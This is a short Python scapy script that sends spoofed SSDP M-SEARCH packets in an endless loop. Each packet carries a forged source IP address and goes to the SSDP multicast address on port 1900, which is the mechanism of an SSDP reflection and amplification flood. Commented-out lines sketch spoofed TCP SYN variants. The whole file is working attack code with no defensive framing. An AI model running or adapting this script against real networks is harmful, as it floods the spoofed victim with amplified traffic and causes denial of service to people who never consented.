#!/usr/local/bin/python
from scapy.all import *

#import module randint from lib random
from random import randint

src_ip = '192.168.187.234' # spoofed source IP src_ipddress
dst_ip = '239.255.255.250' # destination IP address
#dst_ip = '192.168.158.126' # destination IP address
#srp_p = random.randint(1024,65535) # source port

dst_p = 1900

# packet payload
data = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
t0=time.clock()
#for i in range (0,1):
while 1:
	srp_p = random.randint(30000,65535) # source port
	#spoofed_packet = Ether(src=mac_src,dst=mac_dst)/IP(src=src_ip, dst=dst_ip) / TCP(sport=srp_p, dport=dst_p, flags='S') / payload
	#spoofed_packet = IP( src=src_ip, dst=dst_ip) / TCP(sport=srp_p, dport=dst_p, seq=seq,flags='S') / payload
	spoofed_packet = IP( src=src_ip, dst=dst_ip, ttl=200) / UDP(sport=srp_p, dport=dst_p,) / Raw(load=data)
	send(spoofed_packet)
	print spoofed_packet.show()
print time.clock()-t0


